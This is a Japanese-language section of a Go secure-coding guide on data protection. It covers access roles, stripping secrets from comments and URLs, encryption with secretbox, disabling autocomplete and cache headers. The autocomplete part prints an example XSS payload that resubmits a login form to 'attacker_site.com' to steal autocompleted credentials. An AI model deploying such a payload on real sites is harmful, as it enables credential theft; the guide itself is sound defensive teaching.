データの保護
===============

現在、データの保護はセキュリティ全般で最も重要なことの1つです。
以下みたいになったら困りますよね。

![All your data are belong to us](files/cB52MA.jpeg)

簡単に言えば、Webアプリケーションのデータは保護される必要があるのです。そのため、このセクションではデータを保護するさまざまな方法について見ていきます。

最初に取り組むべきことの1つは、ユーザーそれぞれに対して適切な権限を実装し、本当に必要な機能だけにアクセスを制限することです。

例えば、次のようなユーザー・ロールを持つ単純なオンライン・ストアを考えてみましょう。

* セールスユーザー: カタログの閲覧のみ許可
* マーケティングユーザー: 統計情報の確認が可能
* 開発者: ページとウェブアプリケーションの設定変更を許可する

また、システム（ウェブサーバー）構成において、正しいパーミッションを定義するべきです。

最初にやるべきことは各ユーザーに適切なロールを定義することです。

役割の分離とアクセス制御については、さらに、[アクセス制御][5]で説明します。

## Remove sensitive information

Temporary and cache files which contain sensitive information should be removed
as soon as they're not needed. If you still need some of them, move them to
protected areas or encrypt them.

## 機密情報の削除

機密情報を含む一時ファイルやキャッシュファイルは、不要になり次第すぐに削除しましょう。
まだ必要な場合は、保護された場所に移動するか、暗号化しましょう。

### コメント

開発者がソースコードに Todo リストのようなコメントを残すことがあります。
最悪の場合、開発者がクレデンシャルを残すこともあります。

```go
// Secret API endpoint - /api/mytoken?callback=myToken
fmt.Println("Just a random code")
```

上記の例では、開発者がコメント内にエンドポイントの情報を残しています。このエンドポイントが守られていない場合、悪意あるユーアーに利用されてしまうかもしれません。

### URL

HTTP GET メソッドで機密情報を渡すことは、次のような理由でウェブアプリケーションの脆弱性を残すことになります。

1. HTTPS を使用していない場合、MITM 攻撃によりデータを傍受される可能性があります。
2. ブラウザの履歴には、ユーザーの情報が保存されています。URLに
   セッションID、ピン、トークンなど、有効期限のない（あるいはエントロピーの低い）ものが含まれていると、それらを盗まれる可能性があります。
3. 検索エンジンは、ページ内で発見されたURLを保存する
4. HTTPサーバー（例：Apache、Nginx）は、通常、要求されたURLを、クエリ文字列を含めて、暗号化されていない状態でログファイル (例: `access_log`) に書き込みます。

```go
req, _ := http.NewRequest("GET", "http://mycompany.com/api/mytoken?api_key=000s3cr3t000", nil)
```

ウェブアプリケーションが `api_key` を使って、第三者のウェブサイトから情報を取得しようとした場合に、もしも同一のネットワーク内で誰かが盗聴していたら、もしくはプロキシを使っていたとしたら、その情報は盗まれるかもしれません。これは HTTPS を使っていないためです。

GET で渡されたパラメータ(クエリストリング)は、HTTP と HTTPS のどちらを使用しているかに関係なく、ブラウザの履歴やサーバーのアクセスログに綺麗に残ることに注意してください。

HTTPS は、クライアントとサーバー以外の第三者が、やり取りしたデータを取得できないようにするための方法です。
`api_key` のような機密データは、可能な限りリクエストボディか何らかのヘッダに格納する必要があります。同様に、可能な限り一回限りのセッション ID やトークンを使用します。

### 情報は力なり

本番環境上のアプリケーションやシステムのドキュメントは常に削除しましょう。
ドキュメントによっては、ウェブアプリケーションを攻撃するために使われる可能性のあるバージョンや機能を明かしてしまうかもしれません。
(例: Readme, Changelog, etc.)

開発者であるあなたは、ユーザーが使わなくなった機密情報を削除できるようにすべきです。
を削除できるようにする必要があります。例えば、ユーザーが自分のアカウントに期限切れのクレジットカードを持っていて、それを削除したい場合、ウェブアプリケーションはそれを許可すべきです。

不要になった情報は、すべてアプリケーションから削除しなければなりません。

#### 暗号化がカギ

機密性の高い情報は全てウェブアプリケーション内で暗号化する必要があります。
軍用レベルの [Go で利用可能な暗号化][2] を使用してください。詳細については
[暗号に関するプラクティス][3]のセクションを参照してください。

あなたのコードを他の場所に実装する必要がある場合は、バイナリをビルドして共有してください。
リバースエンジニアリングを防ぐ術はありません。

コードにアクセスするための異なるパーミッションを用意し、ソースコードへのアクセスを制限することは最良の方法です。

パスワードやコネクションストリング、平文やセキュリティ的に不十分な形式の機密情報をクライアント側とサーバー側の両方で保存しないでください。（データベースコネクションストリングを保護する方法については、[データベースセキュリティ][4]の例を参照してください）。
安全でない形式（例えば、Adobe Flashやコンパイルされたコード）での埋め込みも含みます。

以下は、外部パッケージを使ってGoで暗号化するシンプルな例です。
`golang.org/x/crypto/nacl/secretbox`:

```go
// Load your secret key from a safe place and reuse it across multiple
// Seal calls. (Obviously don't use this example key for anything
// real.) If you want to convert a passphrase to a key, use a suitable
// package like bcrypt or scrypt.
secretKeyBytes, err := hex.DecodeString("6368616e676520746869732070617373776f726420746f206120736563726574")
if err != nil {
    panic(err)
}

var secretKey [32]byte
copy(secretKey[:], secretKeyBytes)

// You must use a different nonce for each message you encrypt with the
// same key. Since the nonce here is 192 bits long, a random value
// provides a sufficiently small probability of repeats.
var nonce [24]byte
if _, err := rand.Read(nonce[:]); err != nil {
    panic(err)
}

// This encrypts "hello world" and appends the result to the nonce.
encrypted := secretbox.Seal(nonce[:], []byte("hello world"), &nonce, &secretKey)

// When you decrypt, you must use the same nonce and key you used to
// encrypt the message. One way to achieve this is to store the nonce
// alongside the encrypted message. Above, we stored the nonce in the first
// 24 bytes of the encrypted text.
var decryptNonce [24]byte
copy(decryptNonce[:], encrypted[:24])
decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], &decryptNonce, &secretKey)
if !ok {
    panic("decryption error")
}

fmt.Println(string(decrypted))
```

出力は以下です。

```
hello world
```

## 不要なものは無効にする

攻撃ベクトルを減らすためのもう一つの簡単で効率的な方法は、システム上で不要なアプリケーションやサービスを無効にすることです。

### オートコンプリート

[Mozilla のドキュメント][1]によると、次のようにしてフォーム全体のオートコンプリートを無効にすることができます。


```html
<form method="post" action="/form" autocomplete="off">
```

特定のフォーム要素に対しては以下のようにします。

```html
<input type="text" id="cc" name="cc" autocomplete="off">
```

特に、ログインフォームのオートコンプリートを無効にする場合に便利です。ログインページに XSS ベクターが存在する場合を想像してみてください。
悪意のあるユーザが次のようなペイロードを作成した場合、

```javascript
window.setTimeout(function() {
  document.forms[0].action = 'http://attacker_site.com';
  document.forms[0].submit();
}
), 10000);
```

これは、オートコンプリートされたフォームフィールドを `attacker_site.com` に送信します。

### キャッシュ

機密情報を含むページのキャッシュ制御は無効にする必要があります。
次のスニペットに示すように、対応するヘッダーフラグを設定することで実現できます。

```go
w.Header().Set("Cache-Control", "no-cache, no-store")
w.Header().Set("Pragma", "no-cache")
```


`no-cache` 値は、キャッシュされた応答を使用する前にサーバーで再検証するよう、ブラウザに指示します。これはブラウザにキャッシュをしないように指示するものではありません。

一方、`no-store` 値はキャッシュを無効にするためのものです。
リクエストやレスポンスのいかなる部分も保存させません。

`Pragma` ヘッダーは HTTP/1.0 リクエストをサポートするために存在します。

[1]: https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion
[2]: https://godoc.org/golang.org/x/crypto
[3]: ../cryptographic-practices/README.md
[4]: ../database-security/README.md
[5]: ../access-control/README.md